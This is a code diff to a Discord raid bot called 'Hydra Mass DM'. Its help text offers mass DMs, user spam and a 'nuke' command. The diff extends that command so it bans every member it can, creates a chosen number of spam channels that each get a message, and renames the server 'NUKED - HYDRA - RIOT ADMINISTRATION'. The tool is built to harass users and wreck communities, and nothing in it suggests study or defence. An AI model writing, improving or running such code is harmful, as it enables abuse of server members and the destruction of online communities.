@@ -44,7 +44,7 @@ Available commands for the Hydra Mass DM bot :
 **{prefix}massdm (message)** - Send a single message DM to everyone in the server.
 **{prefix}dm (user) (message)** - Send a single message to a specific user.
 **{prefix}spamuser (user) (amount) (message)** - Spam a specific user.
-**{prefix}nuke (members/channels/roles/all)** - Nuke the server.
+**{prefix}nuke (members/channels/roles/all) (channel-amount) (channel-name) (message-content)** - Nuke the server. Channel name should be `like-this` not `LIKE THIS` or `like this`.
 """
 
 nuke_modes = ['members', 'channels', 'roles', 'all']
@@ -150,7 +150,7 @@ async def spamuser(ctx, user: discord.Member, amount: int, *, message: str):
             print(colored("Please specify a message to spam.",'red'))
 
 @client.command()
-async def nuke(ctx, mode: str):
+async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
     validation = command_validation(ctx)
     if validation:
         if ctx.guild:
@@ -163,8 +163,11 @@ async def nuke(ctx, mode: str):
                     for member in guild.members:
                         if str(member.id) not in userid and member.id != client.user.id:
                             if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
-                                await member.ban(reason="HYDRA MASS DM - NUKE")
-                                print(colored(f"Banned {member}",'green'))
+                                try:
+                                    await member.ban(reason="HYDRA MASS DM - NUKE")
+                                    print(colored(f"Banned {member}",'green'))
+                                except discord.errors.Forbidden:
+                                    print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                             else:
                                 print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                     print(colored("HYDRA - MEMBER BAN COMPLETE",'magenta'))
@@ -213,10 +216,19 @@ async def nuke(ctx, mode: str):
                     for member in guild.members:
                         if str(member.id) not in userid and member.id != client.user.id:
                             if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
-                                await member.ban(reason="HYDRA MASS DM - NUKE")
-                                print(colored(f"Banned {member}",'green'))
+                                try:
+                                    await member.ban(reason="HYDRA MASS DM - NUKE")
+                                    print(colored(f"Banned {member}",'green'))
+                                except discord.errors.Forbidden:
+                                    print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                             else:
                                 print(colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
+                    for i in range(channelamount):
+                        nukechannel = await guild.create_text_channel(channelname)
+                        print(colored(f"[{i+1}] Created {nukechannel}",'green'))
+                        await nukechannel.send(message)
+                    await guild.edit(name="NUKED - HYDRA - RIOT ADMINISTRATION")
+                    print(colored(f"Changed server name to NUKED - HYDRA - RIOT ADMINISTRATION",'green'))
                     print(colored("HYDRA - NUKE COMPLETED",'magenta'))
                 else:
                     print(colored("Bot requires admin permissions in the guild to nuke.",'red'))
